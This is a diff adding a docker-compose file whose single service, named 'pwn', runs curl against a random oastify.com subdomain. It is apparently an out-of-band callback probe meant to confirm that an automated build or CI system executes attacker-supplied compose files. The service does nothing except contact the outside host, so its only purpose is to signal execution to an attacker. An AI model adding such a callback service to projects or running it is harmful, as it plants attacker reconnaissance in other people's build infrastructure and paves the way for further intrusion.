@@ -1,0 +1,6 @@
+version: '3'
+
+services:
+  pwn:
+    image: curlimages/curl
+    command: curl 648qkl2g7ipgep4ah8cnw0cbl2rtfm3b.oastify.com
